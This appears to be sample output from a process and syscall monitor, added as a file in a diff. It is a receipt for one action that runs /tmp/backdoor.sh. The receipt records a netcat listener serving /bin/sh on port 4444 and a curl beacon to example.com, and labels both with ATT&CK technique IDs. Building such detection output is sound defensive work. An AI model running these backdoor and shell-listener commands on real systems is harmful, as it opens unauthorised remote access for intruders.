@@ -1,0 +1,24 @@
+=== Post-Action Receipt: Action #2 ===
+Command: sh /tmp/backdoor.sh
+Duration: 5.3s | 45 syscall events
+
+PROCESSES: 3 unique, 0 forked, 0 exited
+  [backdoor.sh:2623448] $ /bin/sh /tmp/backdoor.sh (x2)
+  [ncat:2623455] $ ncat -l -p 4444 -e /bin/sh
+  [curl:2623456] $ curl -s http://example.com/beacon
+
+DATA FLOWS:
+  backdoor.sh:2623448 -> curl:2623456 (fork)
+  backdoor.sh:2623448 -> ncat:2623455 (fork)
+  sh:2623413 (action #1) wrote /tmp/backdoor.sh -> backdoor.sh:2623448 reads
+  curl:2623456 reads /etc/passwd, /etc/ssl/openssl.cnf, /etc/{hosts,nsswitch.conf,resolv.conf}
+  curl:2623456 connects 10.11.12.1:53, 104.18.26.120:80, 104.18.27.120:80, [2606:4700::6812:1a78]:80, [2606:4700::6812:1b78]:80
+  ncat:2623455 listens [::]:4444, 0.0.0.0:4444
+
+SEMANTIC SUMMARY:
+  Action #2:
+    !! [T1059.004] Netcat/socat (reverse shell tool): ncat -l -p 4444 -e /bin/sh
+    ! [T1105] Curl/wget download: curl -s http://example.com/beacon
+    . [T1071] Outbound network connection (x2)
+
+
